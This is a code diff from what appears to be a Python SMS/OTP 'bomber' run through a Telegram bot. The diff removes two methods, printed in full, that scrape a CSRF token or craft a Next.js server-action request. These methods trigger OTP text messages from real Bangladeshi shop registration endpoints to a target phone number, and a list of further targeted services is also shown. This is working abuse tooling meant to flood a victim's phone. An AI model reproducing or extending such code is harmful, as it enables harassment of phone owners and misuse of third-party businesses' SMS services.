@@ -198,87 +198,7 @@ class Bomber:
     return False
 
 
-  def shopbasebd(self):
-    url = "https://shopbasebd.com/store/registration/sendOTP"
-    session = requests.Session()
-
-    headers = {
-        "Host": "shopbasebd.com",
-        "User-Agent": self.getUserAgent(),
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://shopbasebd.com",
-        "Referer": "https://shopbasebd.com/store/registration",
-        "X-Requested-With": "XMLHttpRequest",
-        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-    }
-
-    try:
-      # ১. প্রথমে রেজিস্ট্রেশন পেজ থেকে কুক্ষিগত কুকি এবং CSRF টোকেন ফেচ করা
-      get_res = session.get(
-          "https://shopbasebd.com/store/registration",
-          headers=headers,
-          timeout=5,
-      )
-      if get_res.status_code == 200:
-        # সুন্দরভাবে পেজ থেকে টোকেন বের করার জন্য BeautifulSoup বা Simple String Split ব্যবহার করা যায়
-        html_content = get_res.text
-        token = ""
-
-        # 간단하게 _token ইনপুট ফিল্ড থেকে খুঁজে নেওয়া
-        if 'name="_token" value="' in html_content:
-          token = (
-              html_content.split('name="_token" value="')[1]
-              .split('"')[0]
-              .strip()
-          )
-
-        if token:
-          payload = {"number": self.user_mobile, "_token": token}
-          r = session.post(url, data=payload, headers=headers, timeout=5)
-
-          # রেসপন্স চেক (Laravel সাধারণত JSON বা Success মেসেজ দেয়)
-          if r.status_code == 200:
-            return True
-    except:
-      pass
-    return False
-
-
-#করলাম এড
-
-
-  def rkpl_estore(self):
-    url = "https://estore.rkpl.com.bd/register"
-    
-    # নেক্সট.জেএস সার্ভার অ্যাকশনের জন্য নির্দিষ্ট হেডার্স
-    headers = {
-        "Host": "estore.rkpl.com.bd",
-        "User-Agent": self.getUserAgent(),
-        "Accept": "text/x-component",
-        "Content-Type": "text/plain;charset=UTF-8",
-        "Origin": "https://estore.rkpl.com.bd",
-        "Referer": "https://estore.rkpl.com.bd/register",
-        "Next-Action": "7f1acd7fd062bc1c3a8e5e8fbda9afe7b8302cdaa2",
-        "X-Requested-With": "mark.via.gp",
-        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-    }
-
-    # নেক্সট.জেএস সার্ভার অ্যাকশনের বডি ফরম্যাট অনুযায়ী পেলোড
-    # সাধারণত প্রথম আর্গুমেন্টে ফোন নম্বর বা ফর্ম ডাটা পাস হয়
-    payload = f'[{{"phone":"{self.user_mobile}"}}]'
-
-    try:
-      r = requests.post(url, data=payload, headers=headers, timeout=5)
-      # রেসপন্সে যদি সফলভাবে ওটিপি সেন্ড হয়
-      if r.status_code == 200 and "OTP successfully sent" in r.text:
-        return True
-    except:
-      pass
-    return False
-
-# আবারও করলাম 
-
+  
 
   
 
@@ -327,8 +247,8 @@ class Bomber:
         self.bdtickets,
         self.shopz,
         self.ghorerbazar,
-        self.shopbasebd, #নতুন আসচে 
-        self.rkpl_estore, #ওইটাও আসচে নিজে
+        
+        
         
     ]
 
@@ -547,7 +467,7 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         (
-            "👑 **Developer:**WQ OWNER e (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
             " **Hosted on:** None"
         ),
         reply_markup=get_reply_keyboard(),
